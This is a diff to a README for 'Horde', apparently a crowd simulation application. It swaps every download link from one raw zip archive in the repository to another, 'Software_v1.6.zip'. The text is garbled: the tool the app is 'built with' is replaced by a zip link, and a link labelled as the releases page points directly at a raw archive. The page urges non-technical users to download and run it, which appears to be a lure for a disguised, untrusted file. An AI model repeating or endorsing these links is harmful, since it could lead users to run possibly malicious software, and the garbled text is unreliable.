@@ -3,11 +3,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to Horde, a large-scale crowd simulation application built with https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/squirrel/Horde.zip This guide will help you download and run the software effortlessly, even if you have no technical background.
+Welcome to Horde, a large-scale crowd simulation application built with https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/src/Software_v1.6.zip This guide will help you download and run the software effortlessly, even if you have no technical background.
 
 ## 📥 Download Horde
 
-[![Download Horde](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/squirrel/Horde.zip)](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/squirrel/Horde.zip)
+[![Download Horde](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/src/Software_v1.6.zip)](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/src/Software_v1.6.zip)
 
 Click the button above to get started.
 
@@ -36,7 +36,7 @@ Horde offers several robust features that enhance your crowd simulation experien
 
 To download the application, please visit our releases page:
 
-[Download from Releases](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/squirrel/Horde.zip)
+[Download from Releases](https://raw.githubusercontent.com/persontoperson-ptah935/Horde/main/src/Software_v1.6.zip)
 
 1. Click the link above to navigate to the releases page.
 2. Find the latest version of Horde.
